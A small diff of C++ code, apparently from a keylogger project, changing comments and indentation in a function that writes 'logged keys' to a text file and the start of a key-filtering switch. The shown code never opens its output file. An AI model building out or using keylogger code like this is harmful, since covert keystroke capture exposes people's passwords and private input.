@@ -8,12 +8,13 @@
 
 using namespace std;
 
-//creating a instance to save the logged keys in a text file
+//a instance to save the loged keys to a text file
 void WriteToLog(LPCSTR text){
-    ofstream logfile; //creates object for file stream
-    logfile << text; //writes text string to file
-    logfile.close(); //closed log file
+	ofstream logfile; //creates object for file stream
+	logfile << text; //writes text string to file
+	logfile.close(); //closes the log file
 }
+
 bool KeyIsListed(int iKey){
     switch (iKey)
     {
